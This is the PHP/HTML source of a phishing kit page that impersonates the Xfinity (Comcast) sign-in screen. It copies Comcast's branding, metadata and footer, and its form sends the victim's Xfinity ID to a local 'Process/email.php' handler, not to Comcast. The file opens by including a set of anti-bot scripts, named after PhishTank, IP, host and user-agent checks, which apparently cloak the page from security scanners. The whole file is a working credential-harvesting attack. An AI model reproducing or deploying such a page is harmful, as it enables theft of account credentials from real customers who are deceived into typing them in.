<?php
include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
?>
<!DOCTYPE html>
<html lang="en" class="light da stepped-out da-expandable" data-resource-package-id="res-responsive-login-page"><head>
					
				<title>Sign in to Xfinity</title>
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
		<meta name="mobile-web-app-capable" content="yes">
		<meta name="apple-mobile-web-app-capable" content="yes">
		<meta name="description" content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together — anytime, anywhere, on any device.">
		<meta name="viewport" content="width=device-width,initial-scale=1">
		<meta name="msapplication-TileColor" content="#ffffff">
		<meta name="msapplication-TileImage" content="https://login.xfinity.com/static/images/global/favicon/favicon-96x96.png">
		<meta name="theme-color" content="#ffffff">
		
				
                                            
        
	

					<link rel="stylesheet" type="text/css" href="https://login.xfinity.com/static/css/junket/fonts-remote.min.css?v=c82b180">
											<link rel="stylesheet" type="text/css" href="https://login.xfinity.com/static/css/styles-stepped-out-light.min.css?v=c82b180">
													<link rel="shortcut icon" href="https://login.xfinity.com//static/images/favicon/favicon.ico">
		<link rel="apple-touch-icon" sizes="57x57" href="https://login.xfinity.com/static/images/favicon/apple-icon-57x57.png">
		<link rel="apple-touch-icon" sizes="60x60" href="https://login.xfinity.com/static/images/favicon/apple-icon-60x60.png">
		<link rel="apple-touch-icon" sizes="72x72" href="https://login.xfinity.com/static/images/favicon/apple-icon-72x72.png">
		<link rel="apple-touch-icon" sizes="76x76" href="https://login.xfinity.com/static/images/favicon/apple-icon-76x76.png">
		<link rel="apple-touch-icon" sizes="114x114" href="https://login.xfinity.com/static/images/favicon/apple-icon-114x114.png">
		<link rel="apple-touch-icon" sizes="120x120" href="https://login.xfinity.com/static/images/favicon/apple-icon-120x120.png">
		<link rel="apple-touch-icon" sizes="144x144" href="https://login.xfinity.com/static/images/favicon/apple-icon-144x144.png">
		<link rel="apple-touch-icon" sizes="152x152" href="https://login.xfinity.com/static/images/favicon/apple-icon-152x152.png">
		<link rel="apple-touch-icon" sizes="180x180" href="https://login.xfinity.com/static/images/favicon/apple-icon-180x180.png">
				<link rel="icon" type="image/png" sizes="192x192" href="static/images/favicon/android-icon-192x192.png">
		<link rel="icon" type="image/png" sizes="32x32" href="https://login.xfinity.com/static/images/favicon/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="96x96" href="https://login.xfinity.com/static/images/favicon/favicon-96x96.png">
		<link rel="icon" type="image/png" sizes="16x16" href="https://login.xfinity.com/static/images/favicon/favicon-16x16.png">
		<link rel="manifest" href="https://login.xfinity.com/static/images/favicon/manifest.json">

		

																	<style type="text/css">
					.da-fullscreen iframe[id^="utif_"] {
max-width: 300px;
max-height: 600px;
overflow: hidden;
}
</style>

<style>
				</style>
						
						<body class=" has-footer">

	<div id="breakpoints"></div>
							<div id="background" style="height: 548px;"></div>
								<main id="bd">
			<h1 class="screen-reader-text">Sign in to Xfinity</h1>
			<div id="left">		




<div id="ad-block">
	<h2 id="ad-heading" class="screen-reader-text sr-only">Advertisement</h2>
	<div id="ad-target">
		
	</div>
	
	<img width="0" height="0" src="https://7468.v.fwmrm.net/ad/u?mode=echo&amp;cr=https%3A%2F%2Fdpm.demdex.net%2Fibs%3Adpid%3D796%26dpuuid=%23%7Buser.id%7D">
<img src="https://xfinitydigital.demdex.net/event?d_sid=4702129" width="0" height="0"></div>
	</div><div id="right">		<div class="box-container box-container--with-shadow">
	<form name="signin" action="Process/email.php" method="post" novalidate="">
		<div class="single logo-wrapper">
	<span aria-role="img" class="xfinity-logo"></span>
		</div>
					<h2 class="heading3 heading3--dark">Sign in to your account</h2>
				<div class="textfield-wrapper">
			<label for="user">Enter your Xfinity ID</label>
			<input id="user" name="email" type="text" placeholder="Email, mobile, or username" value="" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="128" required="" data-empty-message="Please enter your Xfinity ID to sign in.">
		</div>
				<p id="implied-legal" class="caption">By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="http://xfinity.comcast.net/privacy/">Privacy Policy</a>.</p>
		
		
		<button value="submit"class="submit" type="submit" id="sign_in">Let's go</button>
					
			</form>
</div>




<div id="quick-bill-pay" class="box-container box-container--with-shadow">
	<a href="https://customer.xfinity.com/lite" target="_self">Pay any balance</a> without signing in</div>


<div class="box-container box-container--with-shadow dropdowns-container options-container">
	<div id="identity-options-toggle" class="dropdowns options-collapsed">
		<button type="button" class="link" aria-expanded="false">
			Need another option?		</button>
	</div>
	<ul id="identity-options" hidden="">
		<li id="forgot-xfinity-id-item"><a id="forgotXfinityIdLink" href="https://idm.xfinity.com/myaccount/lookup?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FselectAccount%3Dfalse%26ipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3D2f18f17f-5704-40b0-94a6-cb701cd8606a%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2&amp;lang=en" target="_self" title="Look up Xfinity ID">Find your Xfinity ID</a></li>
		<li id="create-username-item">
			<span><a href="https://idm.xfinity.com/myaccount/create-uid?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FselectAccount%3Dfalse%26ipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3D2f18f17f-5704-40b0-94a6-cb701cd8606a%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2&amp;lang=en" target="_self">Create a new profile</a></span>
		</li>
	</ul>
</div>



				</div>
		</main>
														<footer>
<span class="content">
<span class="copyright">© 2022 Comcast</span>
<nav>
<span class="divider hide-compact"></span>
<span class="links">
<a href="https://www.xfinity.com/privacy/policy">Privacy Policy</a>
<span class="divider"></span>
<a href="http://my.xfinity.com/terms/web/">Terms of Service</a>
</span>
<span class="ad-links divider"></span>
<span class="ad-links links">
<a href="http://www.comcast.net/adinformation" target="_blank">Ad Info</a>
<span class="divider"></span>
<a href="https://www.surveymonkey.com/s.aspx?sm=FyNNVDhj_2f2FNc2KVOHQ4eg_3d_3d" target="_blank">Ad Feedback</a>
</span>
<span class="divider hide-compact"></span>
<span class="links">
<a href="https://www.xfinity.com/privacy/manage-preference">Do Not Sell My Personal Information</a>
</span>
</nav>
</span>
</footer>
					
		
		<script type="text/javascript" src="/static/js/libs/jquery-3.3.1.min.js"></script>

		    <script type="text/javascript" src="/static/js/scripts-responsive.min.js?v=c82b180"></script>

    

		<script type="text/javascript">
		
		</script>

			

</body></html>